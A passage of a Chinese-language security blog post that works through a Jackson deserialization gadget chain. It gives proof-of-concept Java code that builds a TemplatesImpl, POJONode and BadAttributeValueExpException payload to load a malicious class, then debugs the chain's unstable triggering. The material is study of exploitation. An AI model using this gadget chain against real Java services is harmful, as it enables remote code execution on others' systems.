@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/09/24/Jackson/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-09-23T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-09-24T00:00:00+08:00">
+      September 24, 2025
+    </time>
+    
+
+    <h1 class="title"></h1>
+  </div>
+
+  <div class="content">
+    <p>Spring自带Jackson依赖</p>
+<p>Jackson在调用writeValueAsString序列化一个对象时会自动调用对象的getter方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springonly;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jackson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">        <span class="type">Dashing</span> <span class="variable">dashing</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dashing</span>(<span class="string">&quot;bug1&quot;</span>, <span class="string">&quot;bug2&quot;</span>, <span class="string">&quot;bug3&quot;</span>);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(dashing);</span><br><span class="line">        objectMapper.readValue(json,Dashing.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Dashing</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String name1;</span><br><span class="line">        <span class="keyword">public</span> String name2;</span><br><span class="line">        <span class="keyword">public</span> String name3;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Dashing</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing Constructor&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Dashing</span><span class="params">(String name1,String name2,String name3)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name1=name1;</span><br><span class="line">            <span class="built_in">this</span>.name2=name2;</span><br><span class="line">            <span class="built_in">this</span>.name3=name3;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing 3 args Constructor&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName1</span><span class="params">(String name1)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing setName1&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.name1 = name1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName2</span><span class="params">(String name2)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing setName2&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.name2 = name2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName3</span><span class="params">(String name3)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing setName3&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.name3 = name3;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName3</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing getName3&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name3;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName2</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing getName2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Dashing getName1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509241002677.png" alt="image-20250924100218595"></p>
+<p>可以看到序列化时调用了getter,反序列化调用了setter，而且反序列化还调用的无参构造方法</p>
+<p>所以只要让远程服务器用writeValueAsString序列化TemplatesImpl就可以加载恶意类</p>
+<p>而Jackson自带的POJONode就能调用writeValueAsString序列化</p>
+<p>初版Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jackson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;bug&quot;</span>);</span><br><span class="line">        setField(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonNodes);</span><br><span class="line">       <span class="comment">//这里反射修改是因为BadAttribute的构造函数会调用参数的toString,提前触发构造链可能会对结果造成一定影响，也不利于调试</span></span><br><span class="line">        serial(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//        deserial(serial);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">byte</span>[] bytes = pool.get(<span class="string">&quot;org.example.springjava8.Evil&quot;</span>).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesImplClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        setField(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;dashing&quot;</span>);</span><br><span class="line">        setField(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/bug666&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509241717321.png" alt="image-20250924171722163"></p>
+<p>序列化的时候报NullPointerException,看左下角的调用栈，可以看到BaseJsonNode#writeReplace</p>
+<p>当对象被序列化时，Java 会优先调writeReplace。如果该方法返回了另一个对象，则序列化的内容将基于返回的对象，而非原始对象。</p>
+<p>所以要用javassist给这个方法改个名字或者直接把这个方法删了，避免反序列化出问题（其实序列化的时候已经出问题了）</p>
+<p>最原始的jackson链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jackson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line">        changeMethodName(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>,<span class="string">&quot;writeReplace&quot;</span>,<span class="string">&quot;dashingBug&quot;</span>);</span><br><span class="line"><span class="comment">//        delMethod(&quot;com.fasterxml.jackson.databind.node.BaseJson  Node&quot;,&quot;writeReplace&quot;);</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;bug&quot;</span>);</span><br><span class="line">        setField(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonNodes);</span><br><span class="line">        serial(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//        deserial(serial);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">byte</span>[] bytes = pool.get(<span class="string">&quot;org.example.springjava8.Evil&quot;</span>).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesImplClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        setField(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;dashing&quot;</span>);</span><br><span class="line">        setField(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/bug666&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">delMethod</span><span class="params">(String classname,String originName)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(classname);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(originName);</span><br><span class="line">        ctClass.removeMethod(ctMethod);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        ctClass.toClass(classLoader,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">changeMethodName</span><span class="params">(String classname,String originName,String newName)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(classname);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(originName);</span><br><span class="line">        ctMethod.setName(newName);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        ctClass.toClass(classLoader,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeException#readObject-&gt;POJONode#toString-&gt;TemplatesImpl#getOutputProperties</span><br></pre></td></tr></table></figure>
+
+<p>但是jackson链存在不能稳定触发的问题（但是在我电脑上能稳定触发）</p>
+<p>有时候会触发如下报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">    at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getStylesheetDOM(TemplatesImpl.java:<span class="number">450</span>)</span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">    at java.lang.reflect.Method.invoke(Method.java:<span class="number">483</span>)</span><br><span class="line">    at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:<span class="number">689</span>)</span><br><span class="line">    at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:<span class="number">774</span>)</span><br><span class="line">    ... <span class="number">74</span> more</span><br></pre></td></tr></table></figure>
+
+<p>可能造成报错的点在BeanSerializerBase#serializeFields</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509251512763.png" alt="image-20250925151254655"></p>
+<p>问题出在this._props字段，上图是outputProperties在stylesheeyDOM之前，所以不会报错</p>
+<p>但有时候stylesheeyDOM在outputProperties之前，因为_sdom字段为空就会造成空指针异常。</p>
+<p>从JSON1链中学习稳定触发方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A bit more convoluted example</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment"> * java.lang.reflect.Method.invoke(Object, Object...)</span></span><br><span class="line"><span class="comment"> * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])</span></span><br><span class="line"><span class="comment"> * org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])</span></span><br><span class="line"><span class="comment"> * $Proxy0.getOutputProperties()</span></span><br><span class="line"><span class="comment"> * java.lang.reflect.Method.invoke(Object, Object...)</span></span><br><span class="line"><span class="comment"> * org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(Method, Object, Object[])</span></span><br><span class="line"><span class="comment"> * org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(Object, String)</span></span><br><span class="line"><span class="comment"> * org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(Object, String)</span></span><br><span class="line"><span class="comment"> * org.apache.commons.beanutils.PropertyUtilsBean.getProperty(Object, String)</span></span><br><span class="line"><span class="comment"> * org.apache.commons.beanutils.PropertyUtils.getProperty(Object, String)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject._fromBean(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject.fromObject(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject(AbstractJSON)._processValue(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject._processValue(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject.processValue(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject.containsValue(Object, JsonConfig)</span></span><br><span class="line"><span class="comment"> * net.sf.json.JSONObject.containsValue(Object)</span></span><br><span class="line"><span class="comment"> * javax.management.openmbean.TabularDataSupport.containsValue(CompositeData)</span></span><br><span class="line"><span class="comment"> * javax.management.openmbean.TabularDataSupport.equals(Object)</span></span><br><span class="line"><span class="comment"> * java.util.HashMap&lt;K,V&gt;.putVal(int, K, V, boolean, boolean)</span></span><br><span class="line"><span class="comment"> * java.util.HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> 